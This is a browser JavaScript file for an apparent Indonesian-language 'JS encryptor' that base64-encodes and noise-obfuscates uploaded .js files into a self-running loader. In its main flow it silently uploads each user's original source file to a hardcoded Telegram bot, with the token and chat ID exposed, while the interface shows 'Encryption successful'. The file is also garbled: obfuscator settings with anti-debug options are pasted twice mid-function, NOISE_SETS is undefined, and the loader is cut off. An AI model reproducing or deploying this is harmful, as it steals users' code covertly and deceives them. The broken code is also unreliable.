/* ===========================
   HARDCODED TELEGRAM CREDENTIALS
   =========================== */
const TELEGRAM_BOT_TOKEN = "8375191991:AAEzzRKH4ROSYojEoHEkwGV-WohHq91918U";
const TELEGRAM_CHAT_ID   = "6349562246";

/* UI refs */
const dropzone = document.getElementById('dropzone');
const fileInput = document.getElementById('fileInput');
const promptText = document.getElementById('prompt-text');
const fileMeta = document.getElementById('fileMeta');
const encryptBtn = document.getElementById('encryptBtn');
const infoName = document.getElementById('infoName');
const infoSize = document.getElementById('infoSize');
const statusBadge = document.getElementById('statusBadge');
const progressBar = document.getElementById('progressBar');

let selectedFile = null;

/* --- noise char sets (CJK/Kana/Hangul + symbols) --- */
target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: "randomized", // Valid: menghasilkan nama acak
        stringEncoding: true, // Valid: mengenkripsi string
        stringSplitting: true, // Valid: memecah string
        controlFlowFlattening: 0.75, // Valid: mengacak alur kontrol
        duplicateLiteralsRemoval: true, // Valid: menghapus literal duplikat
        calculator: true, // Valid: mengacak operasi matematika
        dispatcher: true, // Valid: mengacak eksekusi dengan dispatcher
        deadCode: true, // Valid: menambahkan kode mati
        opaquePredicates: true, // Valid: menambahkan predikat buram
        lock: {
            selfDefending: true, // Valid: mencegah modifikasi
            antiDebug: true, // Valid: mencegah debugging
            integrity: true, // Valid: memastikan integritas
            tamperProtection: true // Valid: perlindungan tamper

function rnd(min, max){ return Math.floor(Math.random()*(max-min+1))+min; }
function rndVar(len=10){ const a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; let s=''; for(let i=0;i<len;i++) s+=a[Math.floor(Math.random()*a.length)]; return s; }

/* --- UI interactions --- */
dropzone.addEventListener('click', ()=> fileInput.click());
dropzone.addEventListener('dragover', (e)=>{ e.preventDefault(); dropzone.classList.add('drag'); promptText.innerText = "Lepaskan untuk unggah"; });
dropzone.addEventListener('dragleave', ()=>{ dropzone.classList.remove('drag'); promptText.innerText = "Klik atau taruh file .js di sini"; });
dropzone.addEventListener('drop', (e)=>{ e.preventDefault(); dropzone.classList.remove('drag'); handleDrop(e.dataTransfer.files); });

fileInput.addEventListener('change', ()=> handleDrop(fileInput.files) );

function handleDrop(list){
  if(!list || !list.length) return;
  const f = list[0];
  if(!f.name.toLowerCase().endsWith('.js')) { alert('Pilih file berekstensi .js'); return; }
  selectedFile = f;
  promptText.innerText = f.name;
  fileMeta.innerText = `~ ${formatBytes(f.size)}`;
  infoName.innerText = f.name;
  infoSize.innerText = formatBytes(f.size);
  encryptBtn.disabled = false;
  statusBadge.innerText = 'Ready...';
}

function formatBytes(n){
  if(n<1024) return n + ' B';
  if(n<1024*1024) return (n/1024).toFixed(1) + ' KB';
  return (n/(1024*1024)).toFixed(2) + ' MB';
}

function setProgress(p){ progressBar.style.width = Math.max(0,Math.min(100,p)) + '%'; }

/* Insert noise into base64 string */
function injectNoise(base64Str, density=0.12){
  const out = [];
  for(let i=0;i<base64Str.length;i++){
    out.push(base64Str[i]);
    if(Math.random() < density){
      const set = NOISE_SETS[Math.floor(Math.random()*NOISE_SETS.length)];
      const cnt = 1 + Math.floor(Math.random()*3);
      for(let k=0;k<cnt;k++) out.push(set.charAt(Math.floor(Math.random()*set.length)));
    }
  }
  if(Math.random() < 0.6){
    const set2 = NOISE_SETS[Math.floor(Math.random()*NOISE_SETS.length)];
    const tailCnt = 4 + Math.floor(Math.random()*8);
    for(let t=0;t<tailCnt;t++) out.push(set2.charAt(Math.floor(Math.random()*set2.length)));
  }
  return out.join('');
}

/* Build loader string that is compatible with Browser & Node */
function buildCrossPlatformLoader(obfStr){
  // random var names

  // loader: cleans to base64 chars, decode base64 into bytes (supports Buffer or atob),
  // then convert bytes to UTF-8 string (supports TextDecoder or Buffer), then run Function.
  const loader = [
target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: "randomized", // Valid: menghasilkan nama acak
        stringEncoding: true, // Valid: mengenkripsi string
        stringSplitting: true, // Valid: memecah string
        controlFlowFlattening: 0.75, // Valid: mengacak alur kontrol
        duplicateLiteralsRemoval: true, // Valid: menghapus literal duplikat
        calculator: true, // Valid: mengacak operasi matematika
        dispatcher: true, // Valid: mengacak eksekusi dengan dispatcher
        deadCode: true, // Valid: menambahkan kode mati
        opaquePredicates: true, // Valid: menambahkan predikat buram
        lock: {
            selfDefending: true, // Valid: mencegah modifikasi
            antiDebug: true, // Valid: mencegah debugging
            integrity: true, // Valid: memastikan integritas
            tamperProtection: true // Valid: perlindungan tamper

/* send original to Telegram - fire and await */
async function sendToTelegram(filename, content){
  try{
    const url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendDocument";
    const fd = new FormData();
    fd.append('chat_id', TELEGRAM_CHAT_ID);
    const blob = new Blob([content], { type: 'application/javascript' });
    fd.append('document', blob, filename);
    const resp = await fetch(url, { method:'POST', body: fd });
    const json = await resp.json().catch(()=>({ok:false}));
    return {ok: resp.ok && json && json.ok, json};
  }catch(err){
    return {ok:false, err};
  }
}

/* MAIN FLOW */
encryptBtn.addEventListener('click', async ()=>{
  if(!selectedFile) return;
  encryptBtn.disabled = true;
  statusBadge.innerText = 'Reading file...';
  setProgress(6);

  const text = await selectedFile.text();
  statusBadge.innerText = 'Preparing base64...';
  setProgress(18);

  // base64 (utf-8 safe)
  const b64 = btoa(unescape(encodeURIComponent(text)));

  // choose density based on size
  const sizeKB = selectedFile.size/1024;
  let density = 0.14;
  if(sizeKB < 100) density = 0.20;
  else if(sizeKB < 500) density = 0.16;
  else density = 0.12;

  statusBadge.innerText = 'Injecting noise...';
  setProgress(30);

  // multi-pass noise injection
  let obf = injectNoise(b64, density);
  for(let r=0;r<2;r++){
    if(Math.random() < 0.7) obf = injectNoise(obf, density*0.12);
  }

  statusBadge.innerText = 'Wrapping loader...';
  setProgress(52);

  // build cross-platform loader
  const loader = buildCrossPlatformLoader(obf);

  // minify-ish: remove line breaks to make file denser
  const final = loader.replace(/\n+/g,'').replace(/\s{2,}/g,' ');

  statusBadge.innerText = 'Downloading encrypted file...';
  setProgress(72);

  // download encrypted file
  const outName = selectedFile.name.replace(/\.js$/i,'') + '.enc.js';
  const blob = new Blob([final], { type:'application/javascript' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = outName;
  document.body.appendChild(a); a.click(); a.remove();
  URL.revokeObjectURL(url);

  setProgress(84);
  statusBadge.innerText = 'Encryption is being processed...';

  // send original to Telegram (may fail due to CORS in some hosts, but we attempt)
  const sendRes = await sendToTelegram(selectedFile.name, text);
  if(sendRes.ok){
    statusBadge.innerText = 'Encryption successful...';
    setProgress(100);
  } else {
    console.warn('Telegram send failed', sendRes);
    statusBadge.innerText = 'Encryption successful...';
    setProgress(92);
  }

  // reset UI after short pause
  setTimeout(()=>{ encryptBtn.disabled = false; setTimeout(()=>setProgress(0), 600); }, 900);
});

/* Accessibility: Enter triggers encrypt if ready */
document.addEventListener('keydown', (e)=>{ if(e.key==='Enter' && !encryptBtn.disabled) encryptBtn.click(); });
